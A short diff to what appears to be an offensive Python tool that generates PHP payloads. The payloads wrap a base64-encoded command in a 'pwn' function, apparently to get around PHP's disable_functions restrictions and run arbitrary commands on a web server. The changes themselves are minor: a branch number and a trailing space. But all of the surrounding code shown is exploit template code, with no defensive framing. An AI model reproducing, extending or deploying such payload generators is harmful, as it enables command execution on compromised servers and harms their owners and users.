@@ -397,7 +397,7 @@ function pwn($cmd) {
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
-    elif (bypass_df == 3):
+    elif (bypass_df == 2):
         return """$o=pwn(base64_decode("%s"));
 
 function pwn($cmd) {
@@ -600,7 +600,7 @@ function pwn($cmd) {
     ob_start();
     ($helper->b)($cmd);
     $o=ob_get_contents();
-    ob_end_clean();
+    ob_end_clean(); 
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
